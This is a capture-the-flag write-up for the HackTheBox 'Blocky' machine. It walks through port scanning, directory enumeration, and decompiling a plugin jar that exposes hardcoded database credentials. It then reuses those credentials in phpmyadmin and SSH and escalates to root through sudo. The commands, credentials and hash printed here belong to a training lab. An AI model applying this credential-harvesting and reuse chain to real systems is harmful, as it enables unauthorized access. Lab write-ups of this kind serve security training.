# Blocky | HackTheBox

### 1. Scan
```bash
Nmap scan report for 10.129.58.127
Host is up, received echo-reply ttl 63 (0.32s latency).
Scanned at 2021-07-09 06:58:26 EDT for 834s
Not shown: 65530 filtered ports
Reason: 65530 no-responses
PORT      STATE  SERVICE   REASON         VERSION
21/tcp    open   ftp?      syn-ack ttl 63
22/tcp    open   ssh       syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqVh031OUgTdcXsDwffHKL6T9f1GfJ1/x/b/dywX42sDZ5m1Hz46bKmbnWa0YD3LSRkStJDtyNXptzmEp31Fs2DUndVKui3LCcyKXY6FSVWp9ZDBzlW3aY8qa+y339OS3gp3aq277zYDnnA62U7rIltYp91u5VPBKi3DITVaSgzA8mcpHRr30e3cEGaLCxty58U2/lyCnx3I0Lh5rEbipQ1G7Cr6NMgmGtW6LrlJRQiWA1OK2/tDZbLhwtkjB82pjI/0T2gpA/vlZJH0elbMXW40Et6bOs2oK/V2bVozpoRyoQuts8zcRmCViVs8B3p7T1Qh/Z+7Ki91vgicfy4fl
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgEpgEZGGbtm5suOAio9ut2hOQYLN39Uhni8i4E/Wdir1gHxDCLMoNPQXDOnEUO1QQVbioUUMgFRAXYLhilNF8=
|   256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILqVrP5vDD4MdQ2v3ozqDPxG1XXZOp5VPpVsFUROL6Vj
80/tcp    open   http      syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp  closed sophos    reset ttl 63
25565/tcp open   minecraft syn-ack ttl 63 Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.13 (93%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.12 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=7/9%OT=21%CT=8192%CU=%PV=Y%DS=2%DC=T%G=N%TM=60E82F14%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.007 days (since Fri Jul  9 07:02:57 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8192/tcp)
HOP RTT       ADDRESS
1   314.24 ms 10.10.14.1
2   313.69 ms 10.129.58.127

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  9 07:12:20 2021 -- 1 IP address (1 host up) scanned in 835.04 seconds
```
The machine is running something on port 21 (not responsive, but the port is open), SSH, an Apache web server and a Minecraft service as well on 25565.

### 2. Enumeration
The website is shown to be hosting Wordpress, which is a frontpage for the Minecraft server.
  
*Welcome everyone. The site and server are still under construction so don’t expect too much right now!*
  
*We are currently developing a wiki system for the server and a core plugin to track player stats and stuff. Lots of great stuff planned for the future 🙂*
  
```bash
┌──(kali㉿kali)-[10.10.14.17]-[~/Desktop]
└─$ dirsearch -u http://10.129.58.127/ -x 403                                                           

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra-Tools/dirsearch/logs/errors-21-07-09_07-44-28.log

Target: http://10.129.58.127/

Output File: /home/kali/Extra-Tools/dirsearch/reports/10.129.58.127/_21-07-09_07-44-30.txt

[07:44:30] Starting: 
[07:44:34] 301 -  316B  - /plugins  ->  http://10.129.58.127/plugins/
[07:45:51] 301 -    0B  - /index.php  ->  http://10.129.58.127/                                                                         
[07:45:53] 301 -  319B  - /javascript  ->  http://10.129.58.127/javascript/
[07:45:56] 200 -   19KB - /license.txt                                                                  
[07:46:10] 301 -  319B  - /phpmyadmin  ->  http://10.129.58.127/phpmyadmin/             
[07:46:11] 200 -   10KB - /phpmyadmin/                                
[07:46:11] 200 -   10KB - /phpmyadmin/index.php
[07:46:11] 200 -  745B  - /plugins/                                                    
[07:46:14] 200 -    7KB - /readme.html                                                         
[07:46:32] 301 -  313B  - /wiki  ->  http://10.129.58.127/wiki/                                                   
...
```
Searching for directories shows a /plugins which links to an instance of cute file browser with two files: BlockyCore.jar and griefprevention-1.11.2-3.1.1.298.jar. The wiki/ page comes up pretty bare, just promising a wiki will be there soon.

### 3. Check out the jars
So some googling shows that greifprevention is a real minecraft plugin, so the focus immediately goes to BlockCore. There is one class file inside the extracted jar (it can be double-clicked to open like any other archive). Then upload it to http://www.javadecompilers.com to get the decompiled source.
```java
// 
// Decompiled by Procyon v0.5.36
// 

package com.myfirstplugin;

public class BlockyCore
{
    public String sqlHost;
    public String sqlUser;
    public String sqlPass;
    
    public BlockyCore() {
        this.sqlHost = "localhost";
        this.sqlUser = "root";
        this.sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
    }
    
    public void onServerStart() {
    }
    
    public void onServerStop() {
    }
    
    public void onPlayerJoin() {
        this.sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
    }
    
    public void sendMessage(final String username, final String message) {
    }
}
```
This provides a username and password for SQL: `root:8YsqfCTnvxAUeduzjNSXe22`.

### 4. Access phpmyadmin
With these creds it is now possible to log in over phpmyadmin and access the databases. This of course means access to Wordpress admin credentials from the wp-users table in the wordpress database. Clicking through the phpmyadmin UI, the creds are retrieved as: `notch:$P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/`

### 5. Get a shell
Log in with the username "notch" and the SQL password, and get in.
```bash
┌──(kali㉿kali)-[10.10.14.17]-[~/Desktop]
└─$ ssh notch@10.129.58.127 
notch@10.129.58.127's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Thu Sep 24 08:12:11 2020 from 10.10.14.2
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```
So the creds for this account are: `notch:8YsqfCTnvxAUeduzjNSXe22`

### 6. Escalate to root
This user can run anything as root.
```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```
Escalate to root with sudo.
```bash
notch@Blocky:~$ sudo -i
root@Blocky:~# whoami
root
```